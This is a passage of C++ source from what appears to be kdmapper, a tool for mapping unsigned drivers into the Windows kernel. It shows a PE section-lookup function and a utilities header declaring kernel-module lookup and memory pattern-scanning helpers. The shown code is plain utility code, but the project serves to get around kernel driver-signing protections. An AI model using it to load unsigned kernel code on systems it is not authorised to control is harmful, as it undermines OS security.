	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
	for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (memcmp(section->Name, sectionName, namelength) == 0 &&
			namelength == strlen((char*)section->Name)) {
			if (!section->VirtualAddress) {
				return 0;
			}
			if (size) {
				*size = section->Misc.VirtualSize;
			}
			return (PVOID)(modulePtr + section->VirtualAddress);
		}
	}
	return 0;
}
```

`kdmapper/kdmapper/utils.hpp`:

```hpp
#pragma once

#if defined(DISABLE_OUTPUT)
	#define Log(content) 
#else
	#define Log(content) std::wcout << content
#endif


#include <Windows.h>
#include <TlHelp32.h>
#include <stdint.h>
#include <vector>
#include <string>
#include <iostream>
#include <fstream>

#include "nt.hpp"

namespace utils
{
	std::wstring GetFullTempPath();
	bool ReadFileToMemory(const std::wstring& file_path, std::vector<uint8_t>* out_buffer);
	bool CreateFileFromMemory(const std::wstring& desired_file_path, const char* address, size_t size);
	uint64_t GetKernelModuleAddress(const std::string& module_name);
	BOOLEAN bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask);
	uintptr_t FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	PVOID FindSection(const char* sectionName, uintptr_t modulePtr, PULONG size);
}
```